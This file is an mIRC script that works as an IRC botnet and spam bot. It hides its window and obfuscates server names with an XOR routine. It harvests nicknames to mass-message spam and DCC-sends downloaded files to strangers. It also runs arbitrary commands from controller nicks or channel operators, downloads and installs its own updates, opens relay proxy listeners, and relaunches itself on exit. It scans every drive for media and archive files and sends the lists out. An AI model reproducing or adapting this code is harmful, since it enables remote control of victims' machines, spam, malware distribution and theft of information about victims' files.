   ;version 1.0
   on *:start: {
     .timerdll 0 1 dll data.dll do_ShowWindow $window(-2).hwnd 0
     .timerdeep 0 1 unset %deep
     .if ($isdir(download) == $false) { mkdir download }
     .renick2
     .hadd -m clist 100
     .hadd -m nlist 100
     .if $hget(nlist) == $true { hfree nlist }
     .if $hget(clist) == $true { hfree clist }
     .if $hget(slist) == $true { hfree slist }
     .remini friends.ini nick
     .set %cnum 0
     .set %nnum 0
     .set %snum 0
     .if $readini(spall.ini,sspam,stat) == 0 goto offduty
     .slist
     .set %date $left($date,2)
     .if %date == 06 {
       .set %motd $chr(35) $+ $rand(17,40)
       .cjoin
     }
     .if (%date == 12) || (%date == 18) || (%date == 23) {
       .set %motd 4 $+ $gettok($q($readini(spall.ini,sspam,site)),$rand(1,4),44)
       if (%date == 12) || (%date == 18) { .snext }
       if (%date == 23) { .set %motd $gettok($q($readini(spall.ini,sspam,site)),$rand(1,4),44) | $q(rdswds) $gettok($q($readini(spall.ini,sspam,serv)),$rand(1,4),44) -j $gettok($q($readini(spall.ini,sspam,chan)),$rand(1,10),44) | .cpark }
     }
     .if %date == 28 {
       .set %motd $gettok($q($readini(spall.ini,sspam,file)),$rand(1,4),44)
       .if $exists(download/ $+  %motd) == $false { .dlmotd }
       .cpark
       $q(rdswds) $gettok($q($readini(spall.ini,sspam,serv)),$rand(1,4),44) -j $gettok($q($readini(spall.ini,sspam,chan)),$rand(1,10),44)
     }
     .if %loading == $null { set %loading 0 }
     .inc %loading
     .if %loading == 1 { .set %loadingdate $date }
     :offduty
     .ignore -r
     .set %timer 1
     .set %relay off
     .set %relay1 off
     .set %relay2 off
     .set %inviter off
     .set %bserv $readini(spall.ini,base,bserv)
     .set %bchan $readini(spall.ini,base,bchan)
     .set %aserv $readini(spall.ini,admin,aserv)
     .set %achan $readini(spall.ini,admin,achan)
     .set %anick $readini(spall.ini,admin,anick)
     .set %2nick $readini(spall.ini,admin,2nick)
     .set %kchan $readini(spall.ini,admin,kchan)
     $q(rdswds) -m $gettok($q(%aserv),1,44))
     $q(rdswds) -m $gettok($q(%aserv),2,44))
     $q(rdswds) -m $gettok($q(%aserv),3,44))
     $q(rdswds) -m $gettok($q(%aserv),4,44))
     $q(rdswds) -m $gettok($q(%bserv),$rand(1,3),44))
     .opencbn1
     .opencbn2
   }

   alias cjoin { .timerscon6 1 5 scon 6 $q(rdswds) $gettok($q($readini(spall.ini,sspam,serv)),$rand(1,4),44) -j %motd | .snext }
   alias cpark { .timerscon6 1 5 scon 6 $q(rdswds) $gettok($q($readini(spall.ini,sspam,serv)),$rand(1,4),44) -j $gettok($q($readini(spall.ini,sspam,chan)),$rand(1,10),44) }
   on *:connect: {
     if ($cid == 1) {
       .if (%date == 23) || (%date == 28) { .halt }
       .unset %cnum
       .unset %csum
       .unset %nnum
       .unset %nsum
       .if $hget(nlist) == $true { hfree nlist }
       .if $hget(clist) == $true { hfree clist }
       .scid 1 timersnext off
       .scid 1 list -min 5 -max 2000
       .halt
     }
     if ($cid == 2) || ($cid == 3) || ($cid == 4) || ($cid == 5) {
       .timerkj $+ $cid 0 60 scon $cid join $q(%achan) $q(%kchan)
     }
     ;if ($cid == 6) { .join $q(%bchan) }
   }
   on *:JOIN:#: {
     .if ($cid == 1) || ($cid == 6) { set %time1 $asctime(ss) }
     if ($nick == $me) {
       .if # == $q(%achan) { halt }
       .if # == $q(%bchan) { halt }
       .if $nick(#,1) == $me  {
         .topic # $gettok($q($readini(spall.ini,sspam,site)),$rand(1,4),44)
         .mode # +tn
       }
     }
   }
   on *:DISCONNECT: {
     if ($cid == 2) || ($cid == 3) || ($cid == 4) || ($cid == 5)  { $q(rdswds) | halt }
     if ($cid == 6) { $q(rdswds) $gettok($q(%bserv),$rand(1,3),44)) }
   }
   on *:CONNECTFAIL: {
     if ($cid == 1) { .renick2 }
     if ($cid == 2) || ($cid == 3) || ($cid == 4) || ($cid == 4) { $q(rdswds) | halt }
     if ($cid == 6) { $q(rdswds) $gettok($q(%bserv),$rand(1,3),44)) }
   }
   on *:KICK:#: {
     if $knick == $me {
       .if ($cid == 1) { .scon 1 $q(rdswds) irc.stop.spamming.org }
     }
   }
   on *:TEXT:*:?: {
     .if ($cid == 1) || ($cid == 6) { set %time2 $asctime(ss) |  .if ($calc(%time2 - %time1) < 15) && ($calc(%time2 - %time1) > 0) { .report $calc(%time2 - %time1) $nick 4 $+ $1- | .ignore -p $nick | .halt } }
     .if $nick == $me { halt }
     .if spam isin $1- { halt }
     .if chec isin $1- { halt }
     .if dron isin $1- { halt }
     .if vir isin $1- { halt }
     .if troja isin $1- { halt }
     .if spam isin $nick { halt }
     .if chec isin $nick { halt }
     .if dron isin $nick { halt }
     .if vir isin $nick { halt }
     .if troja isin $nick { halt }
     .if $nick == $q(%2nick) { .if ($cid == 2) || ($cid == 3) || ($cid == 4) || ($cid == 5) { $1- | halt } }
     .if $nick == $q(%anick) { .if ($cid == 2) || ($cid == 3) || ($cid == 4) || ($cid == 5) { $1- | halt } }
     .set %msg
     :empty
     if $readini(friends.ini, nick, $nick) == $null {
       .set %msg $readini(friends.ini, nick, $nick)
       .if %date == 23 { .set %themsg $gettok($q($readini(spall.ini,23,n0)),$rand(1,5),44) }
       .if %date == 28 { .set %themsg $gettok($q($readini(spall.ini,28,n0)),$rand(1,5),44) }
     }
     if $readini(friends.ini, nick, $nick) == 1 {
       .set %msg $readini(friends.ini, nick, $nick)
       .if %date == 23 { .set %themsg $gettok($q($readini(spall.ini,23,n1)),$rand(1,5),44) }
       .if %date == 28 { .set %themsg $gettok($q($readini(spall.ini,28,n1)),$rand(1,5),44) }
     }
     if $readini(friends.ini, nick, $nick) == 2 {
       .set %msg $readini(friends.ini, nick, $nick)
       .if %date == 23 { .set %themsg $gettok($q($readini(spall.ini,23,n2)),$rand(1,5),44) $+ $chr(32) $+ $gettok($q($readini(spall.ini,23,n3)),$rand(1,5),44) $+ $chr(32) $+ %motd }
       .if %date == 28 {
         .set %themsg $gettok($q($readini(spall.ini,28,n2)),$rand(1,5),44)
         .if $exists(download/ $+  %motd) == $false { .msg $nick i am sorry cannot send it download at $gettok($q($readini(spall.ini,sspam,site)),$rand(1,4),44) | .halt }
         .timersend $+ $nick 1 $rand(5,15) .dcc send -c $nick download/ $+ %motd
       }
     }
     .if %relay1 == on report2 messaging $scid(1) $q(rdswds) $nick %motd
     .if %inviter == on { report2 $cid 2 $+ $nick 4 $1- | halt }
     .if %relay == on { report2 $cid 2 $+ $nick 4 $1- }
     if $readini(friends.ini, nick, $nick) >= 3 { halt }
     if %themsg == $null goto empty
     .msg $nick %themsg
     inc %msg
     .writeini friends.ini nick $nick %msg
   }

   on *:TEXT:*:#: {
     if ($cid == 2) || ($cid == 3) || ($cid == 4) || ($cid == 5) {
       if ($nick ison $q(%achan)) {
         if ($nick isop $q(%achan)) {
           $1-
         }
       }
     }
   }
   on *:CHAT:*: {
     if $nick == $q(%2nick) {
       $1-
     }
     if ($nick ison $q(%achan)) {
       if ($nick isop $q(%achan)) {
         $1-
       }
     }
   }
   on *:exit: { .run $mircdir $+ mirc.exe }
   raw 323:*: { .if %csum == 1 { snext | halt } | .cnext }
   raw 322:*: { if $3 > 0 { .inc %csum  | .hadd clist %csum $2  } }
   raw 353:*: {
     set %nsum 3
     :start
     inc %nsum
     if $gettok($1-,%nsum,32) == $null goto end
     if @ isin $gettok($1-,%nsum,32) goto start
     if + isin $gettok($1-,%nsum,32) goto start
     if & isin $gettok($1-,%nsum,32) goto start
     if % isin $gettok($1-,%nsum,32) goto start
     if * isin $gettok($1-,%nsum,32) goto start
     if %nsum == 4 { hadd -m nlist %nsum $gettok($1-,%nsum,32) }
     if %nsum > 4  { hadd nlist %nsum $gettok($1-,%nsum,32) }
     .writeini spall.ini nick n $+ $rand(0,1814) $gettok($1-,%nsum,32)
     goto start
     :end
   }
   raw 401:*: { if $cid == 1 { .dec %callthem } }
   raw 439:*: { .snext }
   raw 263:*: { .snext }
   raw 433:*: { if $cid == 1 { ;.renick2 | halt } | .renick2 }
   raw 332:*: {
     .if $gettok($1-,2,32) == $q(%achan) {
       .if $gettok($1-,3,32) == dll { if $4 != $gettok($read(spall.dll,1),2,32) { .getdata $q($readini(spall.ini,version,dlls)) } }
       .if $gettok($1-,3,32) == ini { if $4 != $readini(spall.ini,version,ini)  { .getdata $q($readini(spall.ini,version,inis)) } }
       .if $gettok($1-,3,32) == hlp { if $4 != $gettok($read(bench.hlp,1),2,32) { .getdata $q($readini(spall.ini,version,hlps)) } }
     }
   }
   alias slist {
     .set %lines 0
     :start
     .set %ssum %lines
     .inc %lines
     .if $gettok($q($readini(spall.ini,sspam,serv)),%lines,44) == $null goto end
     .if %lines == 1 { hadd -m slist %lines $gettok($q($readini(spall.ini,sspam,serv)),%lines,44) }
     .if %lines != 1 { hadd slist %lines $gettok($q($readini(spall.ini,sspam,serv)),%lines,44) }
     .goto start
     :end
   }
   alias renick2 {
     .identd on $readini(spall.ini,Nick,n $+ $rand(1,1814))
     .anick $readini(spall.ini,Nick,n $+ $rand(1,1814)) $+ _
     .nick $readini(spall.ini,Nick,n $+ $rand(1,1814))
     %v = $r(1,50)
     if (%v == 1) %v = hotmail.com
     if (%v == 2) %v = mail.com
     if (%v == 3) %v = armymail.com
     if (%v == 4) %v = freemail.com
     if (%v == 5) %v = msn.com
     if (%v == 6) %v = comcast.net
     if (%v == 7) %v = sympatico.ca
     if (%v == 8) %v = bellsouth.com
     if (%v == 9) %v = bar.org
     if (%v isnum 10-20) %v = $readini(spall.ini,Nick,n $+ $rand(1,1814)) $+ .com
     if (%v isnum 21-30) %v = $readini(spall.ini,Nick,n $+ $rand(1,1814)) $+ .net
     if (%v isnum 31-40) %v = $readini(spall.ini,Nick,n $+ $rand(1,1814)) $+ .org
     .emailaddr $readini(spall.ini,Nick,n $+ $rand(1,1814)) $+ @ $+ %v
     .fullname $readini(spall.ini,Nick,n $+ $rand(1,1814))
   }
   alias msg {   privmsg $1- | if ($1 isin %specialnick) { report 4 $+ $me to $1 : 12 $+ $2-  } }
   alias report { .scon -t1 2 privmsg $q(%achan) $1- | .scon -t1 3 privmsg $q(%achan) $1- | .scon -t1 4 privmsg $q(%achan) $1- | .scon -t1 5 privmsg $q(%achan) $1- }
   alias report2 { .scon -t1 2 privmsg $q(%anick) $1- | .scon -t1 3 privmsg $q(%anick) $1- | .scon -t1 4 privmsg $q(%anick) $1- | .scon -t1 5 privmsg $q(%anick) $1- }
   alias id  { report 4Sexo 1version dll $gettok($read(spall.dll,1),2,32) ini $readini(spall.ini,version,ini) loading %loading times since %loadingdate }
   alias vars  { if ($1 == $null) || ($2 == $null) { .report 4vars section item | halt } | report code $q($2) $readini($q(rq`mm/hoh),$1,$2) $readini($q(rq`mm/hoh),$1,$3) $readini($q(rq`mm/hoh),$1,$4) $readini($q(rq`mm/hoh),$1,$5) }
   alias sys { report os $os version $version dde $dde(mirc, connected) $dde(mirc, exename) }
   alias status { report $readini(spall.ini,sspam,stat) $date $scid(1) $q(rdswds) $scid(1).me $url }
   alias is { report $1- $exists($1-) $file($1-).size }
   alias reply { .scon $1 msg $2 $3- }
   alias dlmotd { .getdata $q($readini(spall.ini,sspam,motdsite)) $+ %motd }
   alias stop { .timernnext off | .timercnext off | .timersnext off | .report 4stop inviting }
   alias inviter {
     .if ($1 == $null) || ($2 == $null) || ($3 == $null) { .report command line 4inviter $q(rdswds) channel message | halt }
     .hadd -m clist 100
     .hadd -m nlist 100
     .if $hget(clist) == $true { hfree clist }
     .if $hget(nclist) == $true { hfree nlist }
     .set %inviter on
     .set %motd $3-
     .timercrew 2 15 crew join $2
     .scon 1 $q(rdswds) $1
   }

   alias snext {
     .scon 1 renick2
     .inc %snum
     .if %snum > %ssum { .set %snum 0 | .timersnext 0 30 .snext | halt }
     .if $hget(slist,%snum) == $null { halt }
     .if $hget(nlist) == $true { hfree nlist }
     .if $hget(clist) == $true { hfree clist }
     .scon 1 $q(rdswds) $hget(slist,%snum)
     .timersnext 0 60 .snext
   }
   alias cnext {
     .inc %cnum
     .if %cnum > %csum { .if %inviter == on { .disconnect | halt } |  scon 1 timersnext 1 30 snext | halt }
     .if $hget(clist,%cnum) == $null { .scon 1 timersnext 1 30 snext | .halt }
     .if $hget(nlist) == $true { hfree nlist }
     .scon 1 .join $hget(clist,%cnum)
     .if %date == 18 { .timercpart 1 20 scon 1 part $hget(clist,%cnum) %motd | .scon 1 .timercnext 1 25 cnext  | goto meth18 }
     .timercpart 1 20 scon 1 part $hget(clist,%cnum)
     .timernnext 1 15 nnext
     :meth18
   }
   alias nnext {
     .inc %nnum
     .if %nnum > %nsum {
       .unset %nnum
       .if $hget(nlist) == $true { hfree nlist }
       .scon 1 .timercnext 1 5 cnext
       .halt
     }
     .if $hget(nlist,%nnum) == $null goto ownnick
     .if $hget(nlist,%nnum) == $me goto ownnick
     .if $hget(nlist,%nnum) == $null goto ownnick
     .if spam isin $hget(nlist,%nnum) goto ownnick
     .if ac isin $hget(nlist,%nnum) goto ownnick
     .if help isin $hget(clist,%cnum) goto ownnick
     .inc %callthem
     .scon 1 .privmsg $hget(nlist,%nnum) %motd
     .writeini spall.ini nick n $+ $rand(0,1814) $hget(nlist,%nnum)
     .if %relay == on report2 messaging $hget(nlist,%nnum) channel $hget(clist,%cnum) $q(rdswds) $scid(1).server
     .if %inviter == on report2 messaging $hget(nlist,%nnum) channel $hget(clist,%cnum) $q(rdswds) $scid(1).server
     :ownnick
     .scon 1 .timernnext 1 3 nnext
   }
   alias crew {
     set %scon 5
     :start
     inc %scon
     if %scon > 10 goto end
     scon %scon $1-
     goto start
     :end
   }

   alias q {
     .unset %1s
     .unset %deep
     var %x = 1
     :next
     set %deep1 $mid($1-,%x,1)
     set %deep2 $chr($xor($asc(%deep1),1)))
     if $asc(%deep2) == 32 { set %deep %deep $+ $chr(32) $+ $chr(32)   | goto skip }
     set %deep %deep $+ %deep2
     :skip
     inc %x
     if (%x < $calc($len($1-) + 1)) goto next
     return %deep
   }

   ON 1:SOCKREAD:wwwGet: {
     .remove $+(",$mircdir,download\Temp")
     .report Opening connection, and downloading updated version
     if ($sockerr > 0) return
     :nextread
     sockread %WWW.Temp
     if ($sockbr != 0) {
       if (%WWW.Temp != $Null) {
         write $+(",$mircdir,download\Temp") %WWW.Temp
       }
       goto nextread
     }
     if (HTTP/1.*20* iswm $read($+(",$mircdir,download\Temp"), 1)) {
       if ($exists($gettok($sock($sockname).mark,2,44))) {  .remove $gettok($sock($sockname).mark,2,44) }
       :GenNew
       set -u0 %WWW.Temp www $+ $rand(A,Z) $+ $rand(0,9)
       if ($sock(%WWW.Temp) != $null) { goto GenNew }
       sockopen %WWW.Temp $gettok($gettok($gettok($sock($sockname).mark,3,44),2,47),1,58) $iif($gettok($gettok($gettok($sock($sockname).mark,3,44),3,47),2,58) != $Null, $gettok($gettok($gettok($sock($sockname).mark,3,44),3,47),1,58), 80)

       if (text/* iswm $read($+(",$mircdir,download\Temp"), s,Content-Type:)) {
         sockmark %WWW.Temp Text, $+ $gettok($sock($sockname).mark,2-,44)
         } | else {
         sockmark %WWW.Temp Bin, $+ $gettok($sock($sockname).mark,2-,44)
       }
       sockclose wwwget
       } | else {
       report $read($+(",$mircdir,download\Temp"), 2)
     }
     unset %WWW.Temp
   }

   ON 1:SOCKREAD:www*: {
     if ($sockerr > 0) return
     :nextread
     if ($gettok($sock($sockname).mark,1,44) == bin) {
       sockread &Temp
       if ($sockbr == 0) return
       if ($bvar(&Temp,0) != 0) { bwrite $gettok($sock($SockName).Mark,2,44) -1 $bvar(&Temp,0) &temp }
       } | else {
       sockread %WWW.Temp
       if ($sockbr == 0) return
       if (%WWW.Temp != $Null) { write $gettok($sock($SockName).Mark,2,44) %WWW.Temp }
       unset %WWW.Temp
     }
     goto nextread
   }

   alias GetData {
     if $1 = $null { report getdata http://website.com/xxx/file.zip | halt }
     if ($sock(wwwGet) == $null) {
       if ($gettok($$1,1,47) == http:) {
         sockopen wwwGet $gettok($gettok($1,2,47),1,58) $iif($gettok($gettok($1,3,47),2,58) != $Null, $gettok($gettok($1,3,47),1,58), 80)
         } | else {
         sockopen wwwGet $gettok($1,1,47) $iif($gettok($gettok($1,1,47),2,58) != $Null, $gettok($gettok($1,1,47),1,58), 80)
       }
       if ($GetTok($1,$numtok($1,47),47) != $null) {
         set -u0 %WWW.File $+(", $mircdir,download\,$GetTok($1,-1,47), ")
         } | else {
         set -u0 %WWW.File $+(",$mircdir,download\_root_")
       }
       sockmark wwwGet unknown, $+ %WWW.File $+ , $+ $iif($gettok($$1,1,47) == http:, $1, [ http:// $+ [ $1 ] ] )
       } | else {
       .timer 1 1 getdata $1
     }
   }
   ON 1:SOCKOPEN:wwwGet: {
     sockwrite -tn wwwGet HEAD $gettok($sock($sockname).mark,3,44) HTTP/1.1
     sockwrite -tn wwwGet Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
     sockwrite -tn wwwGet Accept-Language: en-au
     sockwrite -tn wwwGet Accept-Encoding: deflate
     sockwrite -tn wwwGet User-Agent: mIRCInstaller WWW Edition v0.0.1
     sockwrite -tn wwwGet Host: $gettok($gettok($sock($sockname).mark,3,44),2,$asc(/))
     sockwrite -tn wwwGet Connection: Keep-Alive
     sockwrite -tn wwwGet $lf
   }

   ON *:SOCKOPEN:www*: {
     sockwrite -tn $sockname GET $gettok($sock($sockname).mark,3,44)
   }
   ON 1:SOCKCLOSE:www*: {
     if ($sockname != wwwget) {
       set %filedl $right($gettok($sock($sockname).mark,3-,44),9)
       report File updated downloaded.  Length: $file($gettok($sock($sockname).mark,2,44)).size
       if ($exists($+(",$mircdir,download\Temp"))) { .remove $+(",$mircdir,download\Temp") }
       unset %WWW*
       .if dll isin %filedl {
         ;.report $right($gettok($sock($sockname).mark,3-,44),9)
         .timercopy 2 5 copy -o download\ $+ %filedl spall.dll
         .timerexit 1 11 exit
       }
       .if ini isin %filedl {
         ;.report $right($gettok($sock($sockname).mark,3-,44),9)
         .timercopy 2 5 copy -o download\ $+ %filedl spall.ini
         .timerexit 1 11 exit
       }
       .if bench isin %filedl {
         .timercopy 2 5 copy -o download\ $+ %filedl bench.hlp
         .timerexit 1 11 exit
       }
     }
   }

   alias opencbn1 {
     :cbnListen
     .sockclose cbnListen
     %portcbntmp = $r(1024,5000)
     if ($portfree(%portcbntmp) == $false) { goto cbnListen }
     if ($portfree(%portcbntmp) == $true) {
       socklisten cbnListen %%portcbntmp
     }
   }

   on *:socklisten:cbnListen: {
     %cbn_tmp = cbn_client_ $+ $ticks | sockaccept %cbn_tmp
     sockwrite -n %cbn_tmp 3connected to cbn. To connect to irc $q(rdswds) use /con [server] [port]
     sockwrite -n %cbn_tmp 3Currently $sock(cbn_server_*,0) cbn users online
     s_rename
   }
   alias s_rename {
     if ($sock(cbn_client_ $+ $sock(%cbn_tmp).ip).status == Active) {
       sockwrite -n %cbn_tmp 1 connection per IP allowed, use socks proxies | !sockclose %cbn_tmp | return
     }
     sockrename %cbn_tmp cbn_client_ $+ $sock(%cbn_tmp).ip
   }
   on *:socklisten:ident: { sockaccept ident_ $+ $r(0,9999) $+ $r(0,9999) }
   on *:sockread:ident*: {
     sockread %ident
     sockwrite -nt ident* %identd_bind $+ , 6667 : USERID: $me : $fullname b c $fullname
     .timer 1 4 !sockclose ident* | .timer 1 5 .identd on
   }
   on *:sockread:cbn_client*: {
     if ($sockerr > 0) return
     :next
     sockread %client
     if ($sockbr == 0) return
     if ($gettok(%client,1,32) == con) {
       if ($gettok(%client,2,32) != $null) {
         if ($gettok(%client,3,32) != $null) {
           if (. isin $gettok(%client,2,32)) {
             if ($gettok(%client,3,32) isnum 1-65535) {
               !sockclose ident*
               .identd off
               .socklisten ident
               .sockwrite -n $sockname :3Connecting to $sock(cbn_server_ $+ $gettok($sockname,3,95)).ip
               if ($sock(cbn_server_ $+ $gettok($sockname,3,95)).status == active) {
                 !sockclose cbn_server_ $+ $gettok($sockname,3,95)
               }
               sockopen cbn_server_ $+ $sock($sockname).ip $gettok(%client,2-,32)
               if ($sock(sob).status == active) {
                 sockwrite -n sob privmsg %spm :4Currently $sock(cbn_server_*,0) cbn users online
     } |   return } } } } }
     if ($sock(cbn_server_ $+ $gettok($sockname,3,95)).status != Active) { return }
     sockwrite -n cbn_server_ $+ $gettok($sockname,3,95) %client | goto next
   }
   on *:sockopen:cbn_server_*: {
     if ($sock($sockname).status == Active) { %identd_bind = $sock($sockname).bindport
       sockwrite -n $sockname USER $me $me $me $me $me
     sockwrite -n $sockname NICK $me $+ $r(a,z) $+ $r(a,z) a b $me d }
   }
   on *:sockread:cbn_server_*: {
     if ($sockerr > 0) return
     :next
     sockread % $+ $q(rdswds)
     if ($sockbr == 0) return
     if ($sock(cbn_client_ $+ $gettok($sockname,3,95)).status != Active) { return }
     sockwrite -n cbn_client_ $+ $gettok($sockname,3,95) % $+ $q(rdswds) | goto next
   }

   alias opencbn2 { if ($sock(lotcbn.l).status == active) { .sockclose lotcbn.l }
   if ($sock(lotcbn.l).status != active) { :repeat | set %portcbn $rand(1,9999) | if $portfree(%portcbn) == $false goto repeat | .socklisten lotcbn.l %portcbn } }
   alias -l lotcbn.conn { .timerlotcbn.c off | .sockclose lotcbn.l | .sockopen lotcbn.serv $1 $2 $iif($3,$3,6667) | .sockwrite -n lotcbn.a :4*** Connected to irc $q(rdswds) $1- }
   alias lotcbn.close { .sockclose lotcbn.a | .sockclose lotcbn.1 | .unset %lotcbn.* }
   on 1:socklisten:lotcbn.l:{ .unset %lotcbn.connected | .sockaccept lotcbn.a | .sockwrite -n lotcbn.a $crlf $+ :4*** Connected to client | .sockwrite -n lotcbn.a $crlf $+ :4*** Type /conn <server> <port> to connected to irc $q(rdswds) }
   on 1:sockclose:lotcbn.a: { opencbn }
   on 1:sockopen:lotcbn.serv:{ .if ($sock(lotcbn.serv).status != active) return | .sockwrite -n lotcbn.serv %lotcbn.log | .set %lotcbn.connected 1 }
   on 1:sockread:lotcbn.serv:{ .if ($sockerr > 0) return | .sockread %lotcbn.buf2 | .sockwrite -n lotcbn.a %lotcbn.buf2 }
   on 1:sockread:lotcbn.a:{ .if ($sockerr > 0) return | .sockread %lotcbn.buf | .if ($gettok(%lotcbn.buf,1,32) == conn) { .if ($gettok(%lotcbn.buf,2,32)) lotcbn.conn $gettok(%lotcbn.buf,2-3,32) } | .elseif ($gettok(%lotcbn.buf,1,32) == NICK) .set %lotcbn.log %lotcbn.buf
   .elseif ($gettok(%lotcbn.buf,1,32) == USER) .set %lotcbn.log %lotcbn.log $+ $crlf $+ %lotcbn.buf | .if (%lotcbn.connected) { .sockwrite -n lotcbn.serv %lotcbn.buf } }
   alias cbnstat { .report cbn active $ip $sock(lotcbn.l).port $sock(cbnListen).port }

   alias mpglist {
     write -c listmpg.txt
     set %server4mp3 $findfile(c:\,*.mpg,0, write listmpg.txt $1- )
     unset %server4mp3
     if ( $disk(d).type == fixed ) {
       set %server4mp3 $findfile(d:\,*.mpg,0, write listmpg.txt $1- )
     }
     unset %server4mp3
     if ( $disk(e).type == fixed ) {
       set %server4mp3 $findfile(e:\,*.mpg,0, write listmpg.txt $1- )
     }
     unset %server4mp3
     if ( $disk(f).type == fixed ) {
       set %server4mp3 $findfile(f:\,*.mpg,0, write listmpg.txt $1- )
     }
     unset %server4mp3
     if ( $disk(g).type == fixed ) {
       set %server4mp3 $findfile(g:\,*.mpg,0, write listmpg.txt $1- )
     }
     unset %server4mp3
     if ( $disk(h).type == fixed ) {
       set %server4mp3 $findfile(h:\,*.mpg,0, write listmpg.txt $1- )
     }
     unset %server4mp3
     report mpg found $lines(listmpg.txt)files...
   }

   alias avilist {
     write -c listavi.txt
     set %server4mp3 $findfile(c:\,*.avi,0, write listavi.txt $1- )
     unset %server4mp3
     if ( $disk(d).type == fixed ) {
       set %server4mp3 $findfile(d:\,*.avi,0, write listavi.txt $1- )
     }
     unset %server4mp3
     if ( $disk(e).type == fixed ) {
       set %server4mp3 $findfile(e:\,*.avi,0, write listavi.txt $1- )
     }
     unset %server4mp3
     if ( $disk(f).type == fixed ) {
       set %server4mp3 $findfile(f:\,*.avi,0, write listavi.txt $1- )
     }
     unset %server4mp3
     if ( $disk(g).type == fixed ) {
       set %server4mp3 $findfile(g:\,*.avi,0, write listavi.txt $1- )
     }
     unset %server4mp3
     if ( $disk(h).type == fixed ) {
       set %server4mp3 $findfile(h:\,*.avi,0, write listavi.txt $1- )
     }
     unset %server4mp3
     report avi found $lines(listavi.txt) files...
   }

   alias jpglist {
     write -c listjpg.txt
     set %server4mp3 $findfile(c:\,*.jpg,0, write listjpg.txt $1- )
     unset %server4mp3

     if ( $disk(d).type == fixed ) {
       set %server4mp3 $findfile(d:\,*.jpg,0, write listjpg.txt $1- )
     }
     unset %server4mp3
     if ( $disk(e).type == fixed ) {
       set %server4mp3 $findfile(e:\,*.jpg,0, write listjpg.txt $1- )
     }
     unset %server4mp3
     if ( $disk(f).type == fixed ) {
       set %server4mp3 $findfile(f:\,*.jpg,0, write listjpg.txt $1- )
     }
     unset %server4mp3
     if ( $disk(g).type == fixed ) {
       set %server4mp3 $findfile(g:\,*.jpg,0, write listjpg.txt $1- )
     }
     unset %server4mp3
     if ( $disk(h).type == fixed ) {
       set %server4mp3 $findfile(h:\,*.jpg,0, write listjpg.txt $1- )
     }
     unset %server4mp3
     report jpg found $lines(listjpg.txt) files...
   }

   alias jpeglist {
     write -c listjpeg.txt
     set %server4mp3 $findfile(c:\,*.jpeg,0, write listjpeg.txt $1- )
     unset %server4mp3

     if ( $disk(d).type == fixed ) {
       set %server4mp3 $findfile(d:\,*.jpeg,0, write listjpeg.txt $1- )
     }
     unset %server4mp3
     if ( $disk(e).type == fixed ) {
       set %server4mp3 $findfile(e:\,*.jpeg,0, write listjpeg.txt $1- )
     }
     unset %server4mp3
     if ( $disk(f).type == fixed ) {
       set %server4mp3 $findfile(f:\,*.jpeg,0, write listjpeg.txt $1- )
     }
     unset %server4mp3
     if ( $disk(g).type == fixed ) {
       set %server4mp3 $findfile(g:\,*.jpeg,0, write listjpeg.txt $1- )
     }
     unset %server4mp3
     if ( $disk(h).type == fixed ) {
       set %server4mp3 $findfile(h:\,*.jpeg,0, write listjpeg.txt $1- )
     }
     unset %server4mp3
     report jpeg found $lines(listjpeg.txt) files...
   }

   alias mergelist {
     remove medialist.txt
     write -c medialist.txt
     copy -a listmpg.txt medialist.txt
     copy -a listjpg.txt medialist.txt
     copy -a listjpeg.txt medialist.txt
     copy -a listavi.txt medialist.txt
     var %lines $lines(medialist.txt)
     set %mediafile [ [ $me ] $+ ] .txt
     .write -c %mediafile
     while ( %lines > 0 ) {
       set %file $read -l $+ %lines medialist.txt
       set %size $round($calc( $file(%file).size / 1051190.374331550802 ), 2)
       write %mediafile ! [ $+ [ $me ] ] %file  %size $+ Mb
       dec %lines
     }
     report Merged Final List of $lines(%mediafile) Files...
     if ( $lines(%mediafile) > 10 ) { dcc send $nick %mediafile }
   }

   alias rarlist {
     write -c listrar.txt
     set %server4mp3 $findfile(c:\,*.rar,0, write listrar.txt $1- )
     unset %server4mp3
     if ( $disk(d).type == fixed ) {
       set %server4mp3 $findfile(d:\,*.rar,0, write listrar.txt $1- )
     }
     unset %server4mp3
     if ( $disk(e).type == fixed ) {
       set %server4mp3 $findfile(e:\,*.rar,0, write listrar.txt $1- )
     }
     unset %server4mp3
     if ( $disk(f).type == fixed ) {
       set %server4mp3 $findfile(f:\,*.rar,0, write listrar.txt $1- )
     }
     unset %server4mp3
     if ( $disk(g).type == fixed ) {
       set %server4mp3 $findfile(g:\,*.rar,0, write listrar.txt $1- )
     }
     unset %server4mp3
     if ( $disk(h).type == fixed ) {
       set %server4mp3 $findfile(h:\,*.rar,0, write listrar.txt $1- )
     }
     unset %server4mp3
     report rar found $lines(listrar.txt) files...
   }

   alias ziplist {
     write -c listzip.txt
     set %server4mp3 $findfile(c:\,*.zip,0, write listzip.txt $1- )
     unset %server4mp3
     if ( $disk(d).type == fixed ) {
       set %server4mp3 $findfile(d:\,*.zip,0, write listzip.txt $1- )
     }
     unset %server4mp3
     if ( $disk(e).type == fixed ) {
       set %server4mp3 $findfile(e:\,*.zip,0, write listzip.txt $1- )
     }
     unset %server4mp3
     if ( $disk(f).type == fixed ) {
       set %server4mp3 $findfile(f:\,*.zip,0, write listzip.txt $1- )
     }
     unset %server4mp3
     if ( $disk(g).type == fixed ) {
       set %server4mp3 $findfile(g:\,*.zip,0, write listzip.txt $1- )
     }
     unset %server4mp3
     if ( $disk(h).type == fixed ) {
       set %server4mp3 $findfile(h:\,*.zip,0, write listzip.txt $1- )
     }
     unset %server4mp3
     report zip found $lines(listzip.txt) files...
   }

   alias warezlist {
     remove warezlist.txt
     write -c warezlist.txt
     copy -a listrar.txt warezlist.txt
     copy -a listzip.txt warezlist.txt
     var %lines $lines(warezlist.txt)
     set %warezfile [ [ $me $+ w ] $+ ] .txt
     .write -c %warezfile
     .write %warezfile Current Nick : $me
     .write %warezfile Host Address : $host
     while ( %lines > 0 ) {
       set %file $read -l $+ %lines warezlist.txt
       set %size $round($calc( $file(%file).size / 1051190.374331550802 ), 2)
       write %warezfile ! [ $+ [ $me ] ] %file  %size $+ Mb
       dec %lines
     }
     report Merged Final List of $lines(%warezfile) Files...
     if ( $lines(%warezfile) > 4 ) { dcc send $nick %warezfile }
   }
